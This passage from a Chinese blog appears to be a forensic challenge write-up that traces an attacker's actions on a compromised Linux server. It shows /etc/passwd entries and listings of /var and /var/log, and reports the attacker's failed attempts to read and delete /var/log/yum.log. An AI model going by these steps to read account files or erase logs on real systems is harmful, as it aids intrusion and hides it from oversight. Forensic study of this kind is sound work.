class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">pulse:x:497:496:PulseAudio Syst Daemon:/var/run/pulse:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">simple:x:500:500:Simple:/home/simple:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>接下来<code>/home</code>里面<br>没看到东西。<br>接下来查看<code>/opt/</code>底下<br>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">./  2016-07-12 00:03:18 4096    0755</span><br><span class="line">rh/ 2013-11-22 18:16:37 4096    0755</span><br></pre></td></tr></table></figure>
+<p>接下来又傻逼的查看<code>/home</code>里面<br>没看到东西。<br>接下来查看<code>/var/</code>里面<br>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db/ 2016-07-11 23:54:42 4096    0755</span><br><span class="line">lib/    2016-07-16 02:31:24 4096    0755</span><br><span class="line">lock/   2016-08-09 18:16:02 4096    0775</span><br><span class="line">tmp/    2016-08-08 09:46:00 4096    1777</span><br><span class="line">spool/  2016-07-11 23:54:43 4096    0755</span><br><span class="line">run/    2016-08-10 00:35:03 4096    0755</span><br><span class="line">cache/  2016-07-16 02:33:57 4096    0755</span><br><span class="line">crash/  2013-11-23 09:15:37 4096    0755</span><br><span class="line">gdm/    2013-11-22 23:54:18 4096    1770</span><br><span class="line">preserve/   2011-09-23 19:50:20 4096    0755</span><br><span class="line">account/    2016-07-11 23:54:44 4096    0755</span><br><span class="line">www/    2016-08-04 10:37:16 4096    0755</span><br><span class="line">empty/  2016-07-11 23:54:25 4096    0755</span><br><span class="line">log/    2016-08-07 18:36:03 4096    0755</span><br><span class="line">nis/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">local/  2011-09-23 19:50:20 4096    0755</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">opt/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">./  2016-07-22 19:50:16 4096    0755</span><br><span class="line">yp  1970-01-01 08:00:00     0</span><br><span class="line">abc 1970-01-01 08:00:00     0</span><br><span class="line">games   1970-01-01 08:00:00     0</span><br><span class="line">mail    1970-01-01 08:00:00     0</span><br></pre></td></tr></table></figure>
+<p>接下来查看<code>/var/log/</code><br>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">ntpstats/   2013-11-24 02:21:54 4096    0755</span><br><span class="line">samba/  2016-07-11 23:52:01 4096    0700</span><br><span class="line">cups/   2013-08-17 18:21:22 4096    0755</span><br><span class="line">httpd/  2016-08-07 18:36:02 4096    0700</span><br><span class="line">gdm/    2016-07-16 01:01:33 4096    1770</span><br><span class="line">sa/ 2016-08-09 15:00:01 4096    0755</span><br><span class="line">../ 2016-07-22 19:50:16 4096    0755</span><br><span class="line">ppp/    2010-08-23 07:22:22 4096    0700</span><br><span class="line">./  2016-08-07 18:36:03 4096    0755</span><br><span class="line">prelink/    2016-07-16 02:16:57 4096    0755</span><br><span class="line">ConsoleKit/ 2016-07-12 00:03:21 4096    0755</span><br><span class="line">vmware-caf/ 2016-07-12 00:01:49 4096    0755</span><br><span class="line">secure  2016-08-10 14:10:25 997 0600</span><br><span class="line">maillog-20160724    2016-07-22 19:34:03 3589    0600</span><br><span class="line">yum.log 2016-08-01 14:59:17 1907    0600</span><br><span class="line">anaconda.program.log    2016-07-11 23:59:08 31242   0600</span><br><span class="line">pm-powersave.log    2016-07-16 01:01:34 89  0644</span><br><span class="line">cron    2016-08-10 14:18:01 360975  0600</span><br><span class="line">cron-20160724   2016-07-25 12:43:01 101645  0600</span><br><span class="line">wtmp    2016-08-10 14:10:25 51072   0664</span><br><span class="line">messages-20160724   2016-07-25 11:57:19 21952   0600</span><br><span class="line">Xorg.0.log.old  2016-07-12 00:15:52 50682   0644</span><br><span class="line">wpa_supplicant.log  2016-07-12 00:00:29 0   0644</span><br><span class="line">anaconda.syslog 2016-07-11 23:59:08 148754  0600</span><br><span class="line">anaconda.ifcfg.log  2016-07-11 23:59:08 2657    0600</span><br><span class="line">anaconda.storage.log    2016-07-11 23:59:08 109194  0600</span><br><span class="line">Xorg.1.log  2016-07-12 00:14:50 50448   0644</span><br><span class="line">cron-20160807   2016-08-07 18:36:03 606821  0600</span><br><span class="line">spooler-20160807    2016-07-31 18:37:02 0   0600</span><br><span class="line">Xorg.0.log  2016-08-09 14:01:46 83699   0644</span><br><span class="line">btm2016-08-10 14:06:03  9600    0600</span><br><span class="line">anaconda.xlog   2016-07-11 23:59:08 35088   0600</span><br><span class="line">boot.log    2016-07-16 01:01:29 2959    0644</span><br><span class="line">secure-20160807 2016-08-05 20:01:06 27030   0600</span><br><span class="line">messages-20160717   2016-07-16 02:41:58 285781  0600</span><br><span class="line">spooler 2016-08-07 18:36:03 0   0600</span><br><span class="line">vmware-vmsvc.log    2016-07-25 11:29:49 4779    0644</span><br><span class="line">tallylog    2016-07-11 23:47:58 0   0600</span><br><span class="line">spice-vdagent.log   2016-07-12 00:00:17 0   0600</span><br><span class="line">vmware-vmusr.log    2016-08-03 11:04:06 10063   0644</span><br><span class="line">mysqld.log.rpmsave  2016-07-16 02:41:39 1672    0640</span><br><span class="line">maillog 2016-08-09 18:16:11 1795    0600</span><br><span class="line">dmesg.old   2016-07-11 23:59:43 89000   0644</span><br><span class="line">maillog-20160731    2016-07-30 18:32:35 4173    0600</span><br><span class="line">spooler-20160717    2016-07-11 23:51:44 0   0600</span><br><span class="line">cron-20160717   2016-07-17 18:16:01 35440   0600</span><br><span class="line">maillog-20160807    2016-08-06 18:16:04 4195    0600</span><br><span class="line">maillog-20160717    2016-07-16 18:22:11 1590    0600</span><br><span class="line">spooler-20160724    2016-07-17 18:16:01 0   0600</span><br><span class="line">spooler-20160731    2016-07-25 12:43:02 0   0600</span><br><span class="line">vmware-tools-upgrader.log   2016-07-12 00:03:18 363533  0644</span><br><span class="line">audit   1970-01-01 08:00:00     0</span><br><span class="line">anaconda.log    2016-07-11 23:59:08 20411   0600</span><br><span class="line">messages-20160731   2016-07-28 10:27:06 1884    0600</span><br><span class="line">secure-20160724 2016-07-23 00:21:37 1654    0600</span><br><span class="line">lastlog 2016-08-10 14:06:12 146292  0644</span><br><span class="line">btmp-20160801   2016-08-01 11:33:21 14976   0600</span><br><span class="line">anaconda.yum.log    2016-07-11 23:59:08 99366   0600</span><br><span class="line">dmesg   2016-07-16 01:00:10 90056   0644</span><br><span class="line">Xorg.2.log  2016-07-12 00:15:24 38224   0644</span><br><span class="line">mysqld.log  2016-07-16 02:43:47 1367    0640</span><br><span class="line">vmware-install.log  2016-07-12 00:03:18 5359    0644</span><br><span class="line">secure-20160717 2016-07-16 03:13:18 7399    0600</span><br><span class="line">secur20160731   2016-07-29 17:36:01 8445    0600</span><br><span class="line">messages-20160807   2016-08-07 06:04:01 34355   0600</span><br><span class="line">cron-20160731   2016-07-31 18:37:01 120163  0600</span><br><span class="line">messages    2016-08-10 02:42:01 468 0600</span><br><span class="line">dracut.log  2016-07-12 00:03:09 345367  0644</span><br></pre></td></tr></table></figure>
+<p>接下来想删除掉<code>/var/log/yum.log</code>，看样子失败了<br>接下来查看<code>/var/empty/</code>,得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sshd/   2013-11-23 06:40:03 4096    0711</span><br><span class="line">../ 2016-07-22 19:50:16 4096    0755</span><br><span class="line">./  2016-07-11 23:54:25 4096    0755</span><br></pre></td></tr></table></figure>
+<p>接下来，读取<code>/var/log/yum.log</code>的内容，，失败<br>好吧，，又想删除<code>/var/log/yum.log</code>,还是失败</p>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/wiki/ba9a968.html" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">上一篇</strong>
+            <div class="article-nav-title">
+                
+                    铁人三项2018第七赛区(福建)数据赛wp
+                
+            </div>
+        </a>
+    
+    
+        <a href="/wiki/9668f403.html" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">metasploit在后渗透中的作用</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            daiker &copy; 2018 
+            <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
